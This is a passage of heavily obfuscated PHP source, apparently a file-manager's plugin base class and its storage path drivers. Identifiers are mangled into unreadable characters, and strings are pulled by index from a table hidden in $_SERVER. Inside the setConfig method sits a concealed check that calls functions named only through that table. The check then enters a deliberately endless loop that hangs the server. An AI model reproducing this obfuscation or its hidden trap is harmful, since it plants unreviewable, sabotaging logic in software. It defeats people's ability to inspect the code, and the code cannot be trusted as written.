$°ñ”óı´[$²Çáçş[170]][$²Çáçş[177]]; } $àüíİà = IO::hashSimple($°ñ”óı´[$²Çáçş[84]]); if ($àüíİà) { return $àüíİà; } $…½Ò¦ ¬ = array($°ñ”óı´[$²Çáçş[32]], $°ñ”óı´[$²Çáçş[84]], $°ñ”óı´[$²Çáçş[76]]); if (isset($°ñ”óı´[$²Çáçş[521]])) { $…½Ò¦ ¬[] = $°ñ”óı´[$²Çáçş[521]]; } return md5(implode($²Çáçş[11], $…½Ò¦ ¬)); } final function checkSharePath($¶íõ›÷ê) { $şğ‚ëÈ =& $_SERVER[ñˆ‹ß¿÷]; if (!defined($şğ‚ëÈ[475])) { define($şğ‚ëÈ[514], 0); } if (!$this->isShare($¶íõ›÷ê)) { return !1; } $ã‹èÔ£ = Action($şğ‚ëÈ[1182])->sharePathInfo($¶íõ›÷ê); if (!isset($ã‹èÔ£[$şğ‚ëÈ[84]])) { show_json(LNG($şğ‚ëÈ[1557]), !1); } $this->fileInfo = $ã‹èÔ£[$şğ‚ëÈ[170]]; $this->cachePath = $this->pluginCachePath($this->fileInfo[$şğ‚ëÈ[177]]); return $ã‹èÔ£[$şğ‚ëÈ[84]]; } final function pluginCachePath($øÑ×èÒÔ = '') { $î­½åÙ  =& $_SERVER[ñˆ‹ß¿÷]; $ğ¨µ³»² = IO_PATH_SYSTEM_TEMP . $î­½åÙ [1558] . $this->pluginName; if (!($³ï“Úˆ = IO::infoFull($ğ¨µ³»²))) { return IO::mkdir($ğ¨µ³»² . $î­½åÙ [8] . $øÑ×èÒÔ); } if (empty($øÑ×èÒÔ)) { return $³ï“Úˆ[$î­½åÙ [84]]; } if (!($ø»Íò£ã = IO::fileNameExist($³ï“Úˆ[$î­½åÙ [84]], $øÑ×èÒÔ))) { return IO::mkdir($³ï“Úˆ[$î­½åÙ [84]] . $øÑ×èÒÔ); } return KodIO::make($ø»Íò£ã); } final function pluginCacheFileSet($§Ô´ˆ¬˜, $ã°Ì¼Ğ¬ = '') { $¦Õ‡ó‡ñ =& $_SERVER[ñˆ‹ß¿÷]; if (!($¿¼Ã­¿‡ = IO::infoFull($§Ô´ˆ¬˜))) { return IO::mkfile($§Ô´ˆ¬˜, $ã°Ì¼Ğ¬, REPEAT_REPLACE); } IO::setContent($¿¼Ã­¿‡[$¦Õ‡ó‡ñ[84]], $ã°Ì¼Ğ¬); return $¿¼Ã­¿‡[$¦Õ‡ó‡ñ[84]]; } final function pluginLocalFile($ÔŞê¡©Æ = '') { $öŸÕËí˜ =& $_SERVER[ñˆ‹ß¿÷]; $­Å—û«¤ = TEMP_FILES . "{$this->pluginName}\x2f"; if (!is_dir($­Å—û«¤)) { mk_dir($­Å—û«¤); } if (!$ÔŞê¡©Æ) { return $­Å—û«¤; } $ß¾–ªŠ = IO::info($ÔŞê¡©Æ); $±•åïÑÅ = $this->_tmpFileName($ß¾–ªŠ) . $öŸÕËí˜[10] . $ß¾–ªŠ[$öŸÕËí˜[174]]; if (!checkExtSafe($±•åïÑÅ)) { $±•åïÑÅ = $±•åïÑÅ . $öŸÕËí˜[1559]; } $¡“àò± = $­Å—û«¤ . $±•åïÑÅ; if (@file_exists($¡“àò±)) { return $¡“àò±; } return IO::copy($ÔŞê¡©Æ, $­Å—û«¤, 0, $±•åïÑÅ); } final function appPackage() { $•éÖÑøİ =& $_SERVER[ñˆ‹ß¿÷]; if ($this->packageData) { return $this->packageData; } $Ã®Ç£÷ = $this->parseFile($this->pluginPath . $•éÖÑøİ[1560]); $this->parseLang($Ã®Ç£÷); $‘¶­É±Ş = json_decode_force($Ã®Ç£÷); if (!$‘¶­É±Ş) { return array(); } $ÀéëÎ¬ = Hook::trigger($•éÖÑøİ[1561], $‘¶­É±Ş); if ($ÀéëÎ¬ && is_array($ÀéëÎ¬)) { $‘¶­É±Ş = $ÀéëÎ¬; } $this->packageData = $‘¶­É±Ş; return $‘¶­É±Ş; } public function packageInfoGet($°ÇıˆüÕ) { $Ÿ¥×Ó­ì = $this->appPackage(); return array_get_value($Ÿ¥×Ó­ì, $°ÇıˆüÕ); } public function packageVersion() { return $this->packageInfoGet($_SERVER[ñˆ‹ß¿÷][1562]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[ñˆ‹ß¿÷][1563]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[ñˆ‹ß¿÷][1564]); } public function echoJsAssign($Ê÷¶òÛ§, $³ìåêºÉ) { $this->echoJsAssignArr[$Ê÷¶òÛ§] = $³ìåêºÉ; } private function parseFile($»Ÿ°ìÄ) { $¹•Ïª” =& $_SERVER[ñˆ‹ß¿÷]; $ŒÕŸñ = file_get_contents_nossl($»Ÿ°ìÄ); $Å›·—ŒŠ = array($¹•Ïª”[1565], $¹•Ïª”[1566], $¹•Ïª”[1567], $¹•Ïª”[1568], $¹•Ïª”[1569], $¹•Ïª”[1570], $¹•Ïª”[1571]); $Šç¿—©’ = array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$¹•Ïª”[89]][$¹•Ïª”[1572]]); foreach ($this->echoJsAssignArr as $¯£ªêç¤ => $ „ˆŒº›) { $Å›·—ŒŠ[] = $¹•Ïª”[1573] . $¯£ªêç¤ . $¹•Ïª”[1574]; $Šç¿—©’[] = is_array($ „ˆŒº›) || is_object($ „ˆŒº›) ? rawurlencode(json_encode($ „ˆŒº›)) : $ „ˆŒº›; } if (strstr($ŒÕŸñ, $¹•Ïª”[1575])) { $¦”ÑèĞÕ = rawurlencode(json_encode($this->pluginLangArr)); $ŒÕŸñ = str_replace($¹•Ïª”[1575], $¦”ÑèĞÕ, $ŒÕŸñ); } if (strstr($ŒÕŸñ, $¹•Ïª”[1576])) { $¦”ÑèĞÕ = $¦”ÑèĞÕ = rawurlencode(json_encode($this->getConfig())); $ŒÕŸñ = str_replace($¹•Ïª”[1576], $¦”ÑèĞÕ, $ŒÕŸñ); } $ŒÕŸñ = str_replace($Å›·—ŒŠ, $Šç¿—©’, $ŒÕŸñ); return $ŒÕŸñ; } private function parseLang(&$˜½õº¿) { $Û‚üéØ =& $_SERVER[ñˆ‹ß¿÷]; $ÔéØ…×­ = $Û‚üéØ[1577]; if (!strstr($˜½õº¿, $ÔéØ…×­)) { return; } preg_match_all($Û‚üéØ[1578], $˜½õº¿, $ë—õ¦ö‹); if (!is_array($ë—õ¦ö‹) || count($ë—õ¦ö‹) == 0 || !is_array($ë—õ¦ö‹[0]) || count($ë—õ¦ö‹[0]) == 0) { return; } $ÄŸ¾Ñüá = array(); $ËùÓîğ– = array(); foreach ($ë—õ¦ö‹[0] as $´¼À©àÇ) { $–áû·Óò = substr($´¼À©àÇ, strlen($ÔéØ…×­), -4); $¬êÉ«¨ù = LNG($–áû·Óò); $ÄŸ¾Ñüá[] = $´¼À©àÇ; $ËùÓîğ–[] = str_replace(array($Û‚üéØ[231], $Û‚üéØ[1085], $Û‚üéØ[342], $Û‚üéØ[118]), array($Û‚üéØ[53], $Û‚üéØ[53], $Û‚üéØ[12], $Û‚üéØ[1579]), $¬êÉ«¨ù); } $˜½õº¿ = str_replace($ÄŸ¾Ñüá, $ËùÓîğ–, $˜½õº¿); } private function parseConfig(&$ñœƒÃ…) { $ß®ÎÄ©¦ =& $_SERVER[ñˆ‹ß¿÷]; $ª ì‘â§ = $ß®ÎÄ©¦[1580]; if (!strstr($ñœƒÃ…, $ª ì‘â§)) { return; } preg_match_all($ß®ÎÄ©¦[1581], $ñœƒÃ…, $õİŸòŸæ); if (!is_array($õİŸòŸæ) || count($õİŸòŸæ) == 0 || !is_array($õİŸòŸæ[0]) || count($õİŸòŸæ[0]) == 0) { return; } $Ù—äŠÔ¹ = $this->getConfig(); $Ş¦É¹º = array(); $ßÁ’×²˜ = array(); foreach ($õİŸòŸæ[0] as $Â‹£®Áı) { $¼Íá×¯ = substr($Â‹£®Áı, strlen($ª ì‘â§), -2); $Ş¦É¹º[] = $Â‹£®Áı; $ßÁ’×²˜[] = _get($Ù—äŠÔ¹, $¼Íá×¯); } $ñœƒÃ… = str_replace($Ş¦É¹º, $ßÁ’×²˜, $ñœƒÃ…); } private function parsePackage(&$Í“§Ú¸ç) { $ÃÙ”µ¶À =& $_SERVER[ñˆ‹ß¿÷]; $¡œ´ãŒˆ = $ÃÙ”µ¶À[1582]; if (!strstr($Í“§Ú¸ç, $¡œ´ãŒˆ)) { return; } preg_match_all($ÃÙ”µ¶À[1583], $Í“§Ú¸ç, $ò¢ºš); if (!is_array($ò¢ºš) || count($ò¢ºš) == 0 || !is_array($ò¢ºš[0]) || count($ò¢ºš[0]) == 0) { return; } $®„š¹ä‡ = $this->appPackage(); $–¢¡¹Æ = array(); $´¾²’¹½ = array(); foreach ($ò¢ºš[0] as $øõ¡Ó¥Ä) { $…‰åÍÚ£ = substr($øõ¡Ó¥Ä, strlen($¡œ´ãŒˆ), -2); $–¢¡¹Æ[] = $øõ¡Ó¥Ä; $´¾²’¹½[] = _get($®„š¹ä‡, $…‰åÍÚ£); } $Í“§Ú¸ç = str_replace($–¢¡¹Æ, $´¾²’¹½, $Í“§Ú¸ç); } final function echoFile($»äÙûâ, $Î§Á÷ï£ = false) { $áàê¦„Ş =& $_SERVER[ñˆ‹ß¿÷]; $ÏÚ“Óë® = $this->pluginPath . $»äÙûâ; if (ACT == $áàê¦„Ş[1584]) { echo $áàê¦„Ş[1585] . $this->pluginName . $áàê¦„Ş[8] . $»äÙûâ . $áàê¦„Ş[1586]; if (!file_exists($ÏÚ“Óë®)) { echo $áàê¦„Ş[1587]; return; } } $œíİé£™ = $this->parseFile($ÏÚ“Óë®); $this->parseLang($œíİé£™); $this->parseConfig($œíİé£™); $this->parsePackage($œíİé£™); if (is_array($Î§Á÷ï£)) { $œíİé£™ = str_replace(array_keys($Î§Á÷ï£), array_values($Î§Á÷ï£), $œíİé£™); } echo $áàê¦„Ş[231] . $œíİé£™; } final function initLang() { $ƒ«òâòÆ =& $_SERVER[ñˆ‹ß¿÷]; $Û·µá¼ö = $ƒ«òâòÆ[1588]; $¶³¢Ç˜ = $this->pluginPath . $ƒ«òâòÆ[1589]; $Âöû† = I18n::getType(); $ı’à˜‘† = array(); if (file_exists($¶³¢Ç˜ . $Âöû† . $ƒ«òâòÆ[845])) { $ı’à˜‘† = (include $¶³¢Ç˜ . $Âöû† . $ƒ«òâòÆ[845]); } else { if ($Âöû† == $ƒ«òâòÆ[1590] && !file_exists($¶³¢Ç˜ . $Âöû† . $ƒ«òâòÆ[845]) && file_exists($¶³¢Ç˜ . $ƒ«òâòÆ[1591])) { $ı’à˜‘† = (include $¶³¢Ç˜ . $ƒ«òâòÆ[1591]); } else { if (file_exists($¶³¢Ç˜ . $Û·µá¼ö . $ƒ«òâòÆ[845])) { $ı’à˜‘† = (include $¶³¢Ç˜ . $Û·µá¼ö . $ƒ«òâòÆ[845]); } } } if (!is_array($ı’à˜‘†)) { return array(); } if (@count($ı’à˜‘†) > 0) { I18n::set($ı’à˜‘†); } return $ı’à˜‘†; } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($—Œ–¸¢°) { $¡‚«³éî =& $_SERVER[ñˆ‹ß¿÷]; if (!isset($_SERVER[$¡‚«³éî[879]]) || !isset($_SERVER[$¡‚«³éî[1344]])) { $Í…ÖÊÙ = $¡‚«³éî[881]; $¯ğ¼ŒğĞ = $¡‚«³éî[882]; $Ôã¶‰ = $_SERVER[$¡‚«³éî[883]] . $¡‚«³éî[884]; $´¥ı–ï¼ = $¯ğ¼ŒğĞ($Ôã¶‰); $ÊŸ×—± = explode($¡‚«³éî[231], $´¥ı–ï¼); if (count($ÊŸ×—±) < $¡‚«³éî[626]) { $ãğØåäş = $¡‚«³éî[885]; $ãğØåäş(); } $Çï÷›ğ¨ = $¡‚«³éî[886]; $Çï÷›ğ¨($_SERVER[$¡‚«³éî[887]]); $˜¦ğñö¶ = 1; for ($µßŞøÖ¾ = $˜¦ğñö¶; $µßŞøÖ¾ > 0; $µßŞøÖ¾++) { $Çï÷›ğ¨ = json_encode($GLOBALS[$¡‚«³éî[418]]); } } $this->pluginConfig = array(); return $this->modelPlugin->setConfig($this->pluginName, $—Œ–¸¢°); } public function onSetConfig($Äã¬£˜) { } public function onGetConfig($—×ù³‡’) { } public function onUpdate() { } public function onUninstall() { } public function onChangeOpen() { } public function onChangeClose() { } public function onChangeStatus($¾ºÍÙš) { if ($¾ºÍÙš == 1) { $this->onChangeOpen(); } else { $this->onChangeClose(); } } public function authCheck($™¸Û„Îó = "\160\x6c\165\x67\x69\156\101\165\164\150") { $»÷ùÌÓù =& $_SERVER[ñˆ‹ß¿÷]; if (!defined($»÷ùÌÓù[475])) { return !1; } if (_get($GLOBALS, $»÷ùÌÓù[503])) { return !0; } $†Â–Ò› = $this->getConfig(); if (!$†Â–Ò›[$™¸Û„Îó]) { return !1; } return ActionCall($»÷ùÌÓù[1592], $†Â–Ò›[$™¸Û„Îó]); } public function url($åïÈ¨›å, $Íœ¼Ñ• = '', $¢…ˆÄòû = true) { $¦•«Ûœ¨ =& $_SERVER[ñˆ‹ß¿÷]; $ñŞ³¤÷ = $this->getConfig(); $© È¥½¡ = KOD_VERSION . $¦•«Ûœ¨[10] . KOD_VERSION_BUILD; $òñÄéİ„ = $this->packageVersion(); $ö¿¹†ñö = $© È¥½¡ . $¦•«Ûœ¨[386] . $òñÄéİ„; if (substr($åïÈ¨›å, 0, 4) == $¦•«Ûœ¨[148] || substr($åïÈ¨›å, 0, 2) == $¦•«Ûœ¨[1376]) { $¹´ÃŞ— = $åïÈ¨›å . $¦•«Ûœ¨[1593] . $ö¿¹†ñö; } else { if ($Íœ¼Ñ• == $¦•«Ûœ¨[12]) { $¹´ÃŞ— = $this->pluginHost . $åïÈ¨›å . $¦•«Ûœ¨[1593] . $ö¿¹†ñö; } else { if ($Íœ¼Ñ• === $¦•«Ûœ¨[75]) { $¹´ÃŞ— = $this->pluginHost . $åïÈ¨›å; } else { if ($Íœ¼Ñ• == $¦•«Ûœ¨[1594]) { $¹´ÃŞ— = STATIC_PATH . $åïÈ¨›å . $¦•«Ûœ¨[1593] . $© È¥½¡; } else { if ($Íœ¼Ñ• == $¦•«Ûœ¨[1595]) { $¹´ÃŞ— = APP_HOST . $¦•«Ûœ¨[1596] . $åïÈ¨›å . $¦•«Ûœ¨[1593] . $© È¥½¡; } else { if (isset($ñŞ³¤÷[$Íœ¼Ñ•])) { $¹´ÃŞ— = $ñŞ³¤÷[$Íœ¼Ñ•] . $åïÈ¨›å . $¦•«Ûœ¨[1593] . $ö¿¹†ñö; } } } } } } if (!$¢…ˆÄòû) { return $¹´ÃŞ—; } echo $¹´ÃŞ—; } public function link($¡’ú¯ = false, $‘šÃ‘¼ = '') { $ı§ï“Ú =& $_SERVER[ñˆ‹ß¿÷]; if (!$¡’ú¯) { $this->link($ı§ï“Ú[1597], $ı§ï“Ú[1595]); $this->link($ı§ï“Ú[1598], $ı§ï“Ú[1594]); $this->link($ı§ï“Ú[1599], $ı§ï“Ú[1594]); $this->link($ı§ï“Ú[1600], $ı§ï“Ú[1594]); $this->link($ı§ï“Ú[1601], $ı§ï“Ú[1594]); return; } $›…Õğ´· = $this->url($¡’ú¯, $‘šÃ‘¼, !1); if (substr($¡’ú¯, -3) == $ı§ï“Ú[1602]) { echo $ı§ï“Ú[1603] . $›…Õğ´· . $ı§ï“Ú[1604] . $ı§ï“Ú[231]; } else { if (substr($¡’ú¯, -4) == $ı§ï“Ú[1605]) { echo $ı§ï“Ú[1606] . $›…Õğ´· . $ı§ï“Ú[1607] . $ı§ï“Ú[231]; } } } } goto e“‚ğ‹´; AÂ©˜ˆÕ»«: class PathDriverCOS extends PathDriverBaseS3 { public function __construct($¹¢Ù—‘–) { parent::__construct($¹¢Ù—‘–); $this->signatureVersion($_SERVER[ñˆ‹ß¿÷][216]); } public function uploadFormData($ªïƒàûº, $Á–À™× = 3600) { $ì×ºŒÊÀ =& $_SERVER[ñˆ‹ß¿÷]; $ã™–‚ˆ† = $ì×ºŒÊÀ[198]; $ğ¼«ö•´ = $ì×ºŒÊÀ[232]; $ë–âƒí¼ = $ì×ºŒÊÀ[1317]; $ˆˆÓĞÒ“ = gmdate($ì×ºŒÊÀ[1318], time() + $Á–À™×); $ÙÈ±Ô”¿ = (string) time() . $ì×ºŒÊÀ[71] . (string) (time() + $Á–À™×); $ÄÃœí“ë = array($ì×ºŒÊÀ[1319] => $ˆˆÓĞÒ“, $ì×ºŒÊÀ[1320] => array(array($ì×ºŒÊÀ[1321] => $ã™–‚ˆ†), array($ì×ºŒÊÀ[1322] => $this->bucket), array($ì×ºŒÊÀ[1323], $ì×ºŒÊÀ[1324], $ì×ºŒÊÀ[12]), array($ì×ºŒÊÀ[1325] => $ë–âƒí¼), array($ì×ºŒÊÀ[1326] => $ğ¼«ö•´), array($ì×ºŒÊÀ[1327] => $this->accessKey), array($ì×ºŒÊÀ[1328] => $ÙÈ±Ô”¿))); $ÄÃœí“ë = json_encode($ÄÃœí“ë); $ìÄ¬ó¯Î = hash_hmac($ì×ºŒÊÀ[232], $ÙÈ±Ô”¿, $this->secret); $ÙÑÀõ = sha1($ÄÃœí“ë); $Ñ—ÂĞµñ = hash_hmac($ì×ºŒÊÀ[232], $ÙÑÀõ, $ìÄ¬ó¯Î); $‹“¦šı = array($ì×ºŒÊÀ[1321] => $ã™–‚ˆ†, $ì×ºŒÊÀ[1325] => $ë–âƒí¼, $ì×ºŒÊÀ[1329] => base64_encode($ÄÃœí“ë), $ì×ºŒÊÀ[1326] => $ğ¼«ö•´, $ì×ºŒÊÀ[1327] => $this->accessKey, $ì×ºŒÊÀ[1330] => $ÙÈ±Ô”¿, $ì×ºŒÊÀ[1331] => $Ñ—ÂĞµñ, $ì×ºŒÊÀ[181] => $this->getHost()); return $‹“¦šı; } public function fileOutLink($ˆ¾ĞƒùÀ) { $¼Ö×¾ëó =& $_SERVER[ñˆ‹ß¿÷]; if (substr($ˆ¾ĞƒùÀ, 0, 7) == $¼Ö×¾ëó[1332]) { $ˆ¾ĞƒùÀ = $¼Ö×¾ëó[1333] . substr($ˆ¾ĞƒùÀ, 7); } header($¼Ö×¾ëó[161] . $ˆ¾ĞƒùÀ); die; } } class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($ÚÓÀ¡¹™) { $this->pathParse = $ÚÓÀ¡¹™; $this->model = Model($_SERVER[ñˆ‹ß¿÷][1334]); } public function getPath($ÄÈ›Æ÷) { return trim($ÄÈ›Æ÷, $_SERVER[ñˆ‹ß¿÷][8]); } public function pathFather($ºî±Ï) { $æ‘Äœ›Ò = $this->parse($ºî±Ï); $æ‘Äœ›Ò = $this->infoSimple($ºî±Ï); return $æ‘Äœ›Ò ? $æ‘Äœ›Ò[$_SERVER[ñˆ‹ß¿÷][432]] : !1; } public function pathThis($İ€úü¯£) { $û©ÑÂÇ = $this->infoSimple($İ€úü¯£); return $û©ÑÂÇ ? $û©ÑÂÇ[$_SERVER[ñˆ‹ß¿÷][32]] : !1; } public function getPathOuter($”‚úúÖĞ) { if (!$”‚úúÖĞ) { return $”‚úúÖĞ; } $©ĞìşùÅ = $this->parse($”‚úúÖĞ); return KodIO::make($©ĞìşùÅ[$_SERVER[ñˆ‹ß¿÷][399]]); } public function copyFolderFromIO($Í™ÖæÜ, $šô÷©´Ó, $ñÃè—ÖŸ, $ù€´ÏÔ×, $¨“ø³Õ¥) { $¢Ğ“Ì› = $this->model->copyFolderFromIO($Í™ÖæÜ, $šô÷©´Ó, $ñÃè—ÖŸ, $ù€´ÏÔ×, $¨“ø³Õ¥); return KodIO::make($¢Ğ“Ì›); } public function isParentOf($§¡„Ğ¦¶, $áÈÜ„œÈ) { return $this->model->isParentOf($§¡„Ğ¦¶, $áÈÜ„œÈ); } public function mkfile($åÉ™üÛ, $ã˜ÔÒÄ = '', $ƒöñë” = REPEAT_RENAME) { $×™õŞ =& $_SERVER[ñˆ‹ß¿÷]; $€ì½ “º = $this->parse($åÉ™üÛ); $åÉ™üÛ = $€ì½ “º[$×™õŞ[399]]; for ($È“ô°¸ß = 0; $È“ô°¸ß < count($€ì½ “º[$×™õŞ[1335]]); $È“ô°¸ß++) { $€­œà = $€ì½ “º[$×™õŞ[1335]][$È“ô°¸ß]; if ($È“ô°¸ß == count($€ì½ “º[$×™õŞ[1335]]) - 1) { $åÉ™üÛ = $this->model->mkfile($åÉ™üÛ, $€­œà, $ã˜ÔÒÄ, $ƒöñë”); break; } $åÉ™üÛ = $this->model->mkdir($åÉ™üÛ, $€­œà, REPEAT_SKIP); } return $this->getPathOuter($åÉ™üÛ); } public function mkdir($ŠÜÅÙĞ–, $ÀÙ Ü¤» = REPEAT_SKIP) { $ñ€¢ à” =& $_SERVER[ñˆ‹ß¿÷]; $òÄùöõ„ = $this->parse($ŠÜÅÙĞ–); $ŠÜÅÙĞ– = $òÄùöõ„[$ñ€¢ à”[399]]; for ($ú„¡èôÌ = 0; $ú„¡èôÌ < count($òÄùöõ„[$ñ€¢ à”[1335]]); $ú„¡èôÌ++) { $ÌÅ†¢· = $òÄùöõ„[$ñ€¢ à”[1335]][$ú„¡èôÌ]; $ŠÜÅÙĞ– = $this->model->mkdir($ŠÜÅÙĞ–, $ÌÅ†¢·, $ÀÙ Ü¤»); } return $this->getPathOuter($ŠÜÅÙĞ–); } public function copyFile($ÎÌ­¡¼§, $™ß» «¿, $ÏÊ’¡ÍÕ = REPEAT_REPLACE) { $‹şÜŒÊÍ =& $_SERVER[ñˆ‹ß¿÷]; $ß®†Ÿ¤ = $this->parse($™ß» «¿); $®¨ƒé©¹ = $this->model->copy($ÎÌ­¡¼§, $ß®†Ÿ¤[$‹şÜŒÊÍ[399]], $ÏÊ’¡ÍÕ, $ß®†Ÿ¤[$‹şÜŒÊÍ[84]]); return $®¨ƒé©¹ ? $this->getPathOuter($®¨ƒé©¹) : !1; } public function moveFile($°Úîõè½, $Õâ¤æëè, $Ó²”ä·Å = REPEAT_REPLACE) { $¸Í„‡´ =& $_SERVER[ñˆ‹ß¿÷]; $î¿ÕÖ¾ = $this->parse($Õâ¤æëè); $Åá÷‰–û = $this->model->move($°Úîõè½, $î¿ÕÖ¾[$¸Í„‡´[399]], $Ó²”ä·Å, $î¿ÕÖ¾[$¸Í„‡´[84]]); return $Åá÷‰–û ? $this->getPathOuter($Åá÷‰–û) : !1; } public function copy($Ø÷È°¾æ, $òó§‘Ù², $½â…¦¯É = REPEAT_REPLACE, $Óï×– = false) { $´¼©ôê = $this->parse($òó§‘Ù²); $›£üÑ®Õ = $this->model->copy($Ø÷È°¾æ, $´¼©ôê[$_SERVER[ñˆ‹ß¿÷][399]], $½â…¦¯É, $Óï×–); return $›£üÑ®Õ ? $this->getPathOuter($›£üÑ®Õ) : !1; } public function moveSameAllow() { } public function move($ú¤ÍéñÛ, $µéïäˆ’, $Å•ßõúè = REPEAT_REPLACE, $˜ÒÃ‰…Å = false) { $œŒ°ˆ¹ = $this->parse($µéïäˆ’); $ô°Éñ¨ª = $this->model->move($ú¤ÍéñÛ, $œŒ°ˆ¹[$_SERVER[ñˆ‹ß¿÷][399]], $Å•ßõúè, $˜ÒÃ‰…Å); return $ô°Éñ¨ª ? $this->getPathOuter($ô°Éñ¨ª) : !1; } public function remove($›ÃÓ½Éñ, $Àì‘“«ä = true) { return $this->model->remove($›ÃÓ½Éñ, $Àì‘“«ä); } public function rename($Şı˜Ÿñİ, $ìºİØªä) { $µÒÌ²Û = $this->model->rename($Şı˜Ÿñİ, $ìºİØªä); return $µÒÌ²Û ? $this->getPathOuter($Şı˜Ÿñİ) : $µÒÌ²Û; } public function size($“­æ¹ıç) { $õ¨şŸ¦ = $this->infoSimple($“­æ¹ıç); return $õ¨şŸ¦ ? $õ¨şŸ¦[$_SERVER[ñˆ‹ß¿÷][76]] : 0; } public function infoSimple($×ÆÎ‹€ğ) { return $this->model->sourceInfo($×ÆÎ‹€ğ); } public function info($·‚Éúêù) { return $this->infoParse($·‚Éúêù); } public function infoAuth($¡ç¶¦À) { return $this->infoParse($¡ç¶¦À, !1, !0); } public function infoWithChildren($ÕáŒü×) { return $this->infoParse($ÕáŒü×, !0); } protected function infoParse($ªÑ†µØà, $¢Ğ»’ºü = false, $Ø—òøˆŠ = false) { if (!$¢Ğ»’ºü) { return $this->model->pathInfo($ªÑ†µØà, $Ø—òøˆŠ); } return $this->model->pathInfoMore($ªÑ†µØà); } public function infoFull($ÇÏ½Š À) { $ÁÚ”´›’ =& $_SERVER[ñˆ‹ß¿÷]; $íÖÈ® = explode($ÁÚ”´›’[8], $ÇÏ½Š À); $ÀŞ¶àœÜ = implode($ÁÚ”´›’[8], array_splice($íÖÈ®, 1)); return $this->model->pathInfoByPath($íÖÈ®[0], $ÀŞ¶àœÜ); } public function hashSimple($›‡ê±ªÕ) { $ö Ÿ…  =& $_SERVER[ñˆ‹ß¿÷]; $Ìıã¼è = $this->infoWithChildren($›‡ê±ªÕ); return $Ìıã¼è[$ö Ÿ… [170]][$ö Ÿ… [177]]; } public function hashMd5($Ù€îáåÔ) { $©Ôä£ôÀ =& $_SERVER[ñˆ‹ß¿÷]; $Îˆ”¿Š¡ = $this->infoWithChildren($Ù€îáåÔ); return $Îˆ”¿Š¡[$©Ôä£ôÀ[170]][$©Ôä£ôÀ[176]]; } public function exist($Œé«ëÇã) { $«‘¢Ã =& $_SERVER[ñˆ‹ß¿÷]; $Ò’Ş„¸× = $this->parse($Œé«ëÇã); if (!$Ò’Ş„¸×[$«‘¢Ã[84]]) { return $this->isFile($Œé«ëÇã) || $this->isFolder($Œé«ëÇã); } $úæãÔ”˜ = array($«‘¢Ã[401] => $Ò’Ş„¸×[$«‘¢Ã[399]], $«‘¢Ã[32] => $Ò’Ş„¸×[$«‘¢Ã[84]]); $ê‚åãÆ¾ = $this->model->where($úæãÔ”˜)->find(); return $ê‚åãÆ¾ ? !0 : !1; } public function isFile($èúÁ¢Ñ) { $¨÷ü‰”ğ =& $_SERVER[ñˆ‹ß¿÷]; $úƒõŠ„„ = $this->infoSimple($èúÁ¢Ñ); return $úƒõŠ„„ && $úƒõŠ„„[$¨÷ü‰”ğ[410]] == $¨÷ü‰”ğ[88] ? !1 : !0; } public function isFolder($€œá•Ó‚) { $ îû³×… =& $_SERVER[ñˆ‹ß¿÷]; $òÂË„äÑ = $this->infoSimple($€œá•Ó‚); return $òÂË„äÑ && $òÂË„äÑ[$ îû³×…[410]] == $ îû³×…[88] ? !0 : !1; } public function listPath($ÃµÅí¼©, $¬«†‚…£ = false) { $ÅåëŞÎ– =& $_SERVER[ñˆ‹ß¿÷]; if ($ÃµÅí¼© == $ÅåëŞÎ–[12]) { return !1; } $óñ½ŸÇÙ = array($ÅåëŞÎ–[401] => $ÃµÅí¼©); if ($¬«†‚…£) { return $this->model->listSource($óñ½ŸÇÙ, -1); } return $this->model->listSource($óñ½ŸÇÙ); } public function has($–ûı¼Ãæ, $–àí·ì³ = false, $î¦Âà‡ª = null) { $§··Ú±¿ =& $_SERVER[ñˆ‹ß¿÷]; $ÂƒÃ–ã = $this->infoWithChildren($–ûı¼Ãæ); if ($–àí·ì³) { return array($§··Ú±¿[208] => $ÂƒÃ–ã[$§··Ú±¿[208]], $§··Ú±¿[207] => $ÂƒÃ–ã[$§··Ú±¿[207]]); } return $î¦Âà‡ª ? $ÂƒÃ–ã[$§··Ú±¿[208]] : $ÂƒÃ–ã[$§··Ú±¿[207]]; } public function listAll($ºİ™±öı) { $‡–ˆæ± = IO::info($this->pathParse[$_SERVER[ñˆ‹ß¿÷][84]]); if (!$‡–ˆæ±) { return array(); } return $this->model->listAll($ºİ™±öı); } public function getContent($§¿áÔÃ) { return $this->model->getContent($§¿áÔÃ); } public function setContent($æ¥’ò Ò, $§¿×à“Î = '') { return $this->model->setContent($æ¥’ò Ò, $§¿×à“Î); } public function fileSubstr($¨÷ŠÉƒ, $ùåÙ÷, $«…ƒ¯åÌ) { return $this->model->fileSubstr($¨÷ŠÉƒ, $ùåÙ÷, $«…ƒ¯åÌ); } public function download($‹ºÕÜ…Ø, $Ş¸è¾Éë = '') { $ëü—•• = get_path_father($Ş¸è¾Éë); $õ¨ŸèÄŒ = get_path_this($Ş¸è¾Éë); $Îø“µä = $this->model->fileInfoGet($‹ºÕÜ…Ø); $º”×´¯ã = IO::copy($Îø“µä[$_SERVER[ñˆ‹ß¿÷][84]], $ëü—••, !1, $õ¨ŸèÄŒ); return $º”×´¯ã; } public function setModifyTime($¯£Í÷¯”, $ÃÁ¶Í = '') { $—ôÁÖ¤É =& $_SERVER[ñˆ‹ß¿÷]; if (!$¯£Í÷¯”) { return; } $this->model->where(array($—ôÁÖ¤É[417] => $¯£Í÷¯”))->save(array($—ôÁÖ¤É[85] => $ÃÁ¶Í)); } public function upload($œÎÜÄÔ, $á¾û±ºÖ, $±ßíæüæ = false, $ÙŞì–å = REPEAT_REPLACE) { $ÄÈåßÆ´ =& $_SERVER[ñˆ‹ß¿÷]; $Ó½œ²ö = $this->parse($œÎÜÄÔ); $Õ†ÃÇ» = $this->model->addFile($Ó½œ²ö[$ÄÈåßÆ´[399]], $á¾û±ºÖ, $Ó½œ²ö[$ÄÈåßÆ´[84]], $±ßíæüæ, $ÙŞì–å); return $this->getPathOuter($Õ†ÃÇ»); } public function uploadFileByID($ïæ™Áã, $ë†à¸’, $±Œ‚£İç) { $˜¤®ğ =& $_SERVER[ñˆ‹ß¿÷]; $¯Ö°‹ó = $this->parse($ïæ™Áã); $…ÛˆÍéæ = $this->model->addFileByFileID($¯Ö°‹ó[$˜¤®ğ[399]], 